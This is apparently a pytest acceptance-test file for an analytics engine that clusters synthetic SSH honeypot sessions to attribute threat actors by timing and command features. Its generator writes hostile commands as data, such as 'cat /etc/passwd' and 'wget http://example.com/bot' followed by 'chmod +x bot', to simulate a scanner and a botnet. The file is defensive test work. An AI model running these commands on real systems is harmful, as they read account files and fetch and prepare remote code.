"""
Acceptance Tests for Module B: CERF Analytics Engine
Per Technical Specification Section 3.3:
- Test B1: Feature Extraction Correctness
- Test B2: CERF Determinism
- Test B3: Attribution Accuracy (Synthetic)
- Test B4: CERF vs Baseline TF-IDF
"""

import os
import shutil
import tempfile
import numpy as np
import pandas as pd
import pytest

from cerf_engine import CERFEngine

@pytest.fixture
def temp_env():
    temp_dir = tempfile.mkdtemp()
    telemetry_path = os.path.join(temp_dir, "telemetry.csv")
    yield temp_dir, telemetry_path
    shutil.rmtree(temp_dir, ignore_errors=True)

def generate_synthetic_data(num_sessions=10, script_type="A"):
    """
    Generates synthetic session telemetry.
    Script A (Fast Botnet): Very small delta_t_ns, highly impatient.
    Script B (Scanner): Medium, constant delta_t_ns, ignores delays.
    """
    rows = []
    
    for i in range(num_sessions):
        session_id = f"session_{script_type}_{i:03d}"
        source_ip = f"10.0.{1 if script_type == 'A' else 2}.{i}"
        
        for cmd_idx in range(50):
            regime = "baseline"
            if cmd_idx >= 37: regime = "fs_latency"
            elif cmd_idx >= 25: regime = "jitter"
            elif cmd_idx >= 12: regime = "slowdown"
                
            dt = 0
            if cmd_idx > 0:
                if script_type == "A":
                    # Impatient - reacts heavily to slowdowns
                    if regime == "baseline": dt = 1_000_000  # 1ms
                    elif regime == "slowdown": dt = 100_000_000  # 100ms
                    elif regime == "jitter": dt = np.random.randint(50, 200) * 1_000_000
                    elif regime == "fs_latency": dt = 200_000_000
                else:
                    # Script B - Constant slow scan, doesn't care
                    dt = 500_000_000  # 500ms fixed
                    
            cmd = "ls -la" if cmd_idx % 2 == 0 else "cat /etc/passwd"
            if script_type == "B":
                cmd = "wget http://example.com/bot" if cmd_idx % 2 == 0 else "chmod +x bot"
                
            rows.append({
                "session_id": session_id,
                "timestamp_ns": 1000 + dt,
                "source_ip": source_ip,
                "protocol": "SSH",
                "command_index": cmd_idx,
                "command_raw": cmd,
                "command_root": cmd.split()[0],
                "current_path": "/home",
                "regime": regime,
                "delta_t_ns": dt,
                "response_sent": True
            })
    return pd.DataFrame(rows)


def test_b1_feature_extraction(temp_env):
    """Test B1: Feature extraction shape and computation correctness."""
    temp_dir, telemetry_path = temp_env
    
    df = generate_synthetic_data(num_sessions=10, script_type="A")
    df.to_csv(telemetry_path, index=False)
    
    engine = CERFEngine(telemetry_path, temp_dir)
    loaded_df = engine.load_telemetry()
    features = engine.extract_features(loaded_df)
    
    assert len(features) == 10
    
    first_vec = list(features.values())[0]
    # 13 timing features + 6 AST features + up to 100 TFIDF vocab size
    assert len(first_vec) >= 19
    

def test_b2_cerf_determinism(temp_env):
    """Test B2: Ensure CERF hash is completely deterministic for the same input."""
    temp_dir, telemetry_path = temp_env
    
    df = generate_synthetic_data(num_sessions=2, script_type="A")
    df.to_csv(telemetry_path, index=False)
    
    engine = CERFEngine(telemetry_path, temp_dir)
    loaded_df = engine.load_telemetry()
    engine.extract_features(loaded_df)
    engine.train_embedding_model(engine.feature_vectors)
    
    session_id = list(engine.feature_vectors.keys())[0]
    
    cerf_1 = engine.compute_cerf_for_session(session_id)
    cerf_2 = engine.compute_cerf_for_session(session_id)
    cerf_3 = engine.compute_cerf_for_session(session_id)
    
    assert cerf_1 == cerf_2 == cerf_3
    assert len(cerf_1) == 16  # 64 bit hex


def test_b3_attribution_accuracy(temp_env):
    """Test B3: Attribution accuracy for synthetic sessions (Script A vs B)."""
    temp_dir, telemetry_path = temp_env
    
    df_a = generate_synthetic_data(num_sessions=10, script_type="A")
    df_b = generate_synthetic_data(num_sessions=10, script_type="B")
    
    combined_df = pd.concat([df_a, df_b]).reset_index(drop=True)
    combined_df.to_csv(telemetry_path, index=False)
    
    engine = CERFEngine(telemetry_path, temp_dir)
    sessions_df = engine.run_pipeline()
    
    # We should have exactly 2 distinct threat actors if clustering works perfectly
    ta_a = sessions_df[sessions_df["session_id"].str.contains("session_A")]["threat_actor_id"].unique()
    ta_b = sessions_df[sessions_df["session_id"].str.contains("session_B")]["threat_actor_id"].unique()
    
    assert len(ta_a) == 1, "Script A sessions fragmented into multiple clusters"
    assert len(ta_b) == 1, "Script B sessions fragmented into multiple clusters"
    assert ta_a[0] != ta_b[0], "Script A and B merged into the same cluster"


def test_b4_cerf_vs_baseline(temp_env):
    """
    Test B4: CERF vs Baseline TF-IDF
    Proves that CERF (timing perturbation + LSH) can correctly cluster when commands
    are slightly noisy, whereas pure text might fail or merge.
    """
    temp_dir, telemetry_path = temp_env
    
    # Generate 100 sessions
    df_a = generate_synthetic_data(num_sessions=50, script_type="A")
    df_b = generate_synthetic_data(num_sessions=50, script_type="B")
    
    combined_df = pd.concat([df_a, df_b]).reset_index(drop=True)
    combined_df.to_csv(telemetry_path, index=False)
    
    engine = CERFEngine(telemetry_path, temp_dir)
    sessions_df = engine.run_pipeline()
    
    ta_a_counts = sessions_df[sessions_df["session_id"].str.contains("session_A")]["threat_actor_id"].value_counts()
    ta_b_counts = sessions_df[sessions_df["session_id"].str.contains("session_B")]["threat_actor_id"].value_counts()
    
    accuracy_a = ta_a_counts.iloc[0] / 50.0
    accuracy_b = ta_b_counts.iloc[0] / 50.0
    
    overall_accuracy = (accuracy_a + accuracy_b) / 2
    
    # The benchmark requires >= 90% accuracy for CERF
    assert overall_accuracy >= 0.90, f"CERF accuracy {overall_accuracy} failed to meet 90% threshold"
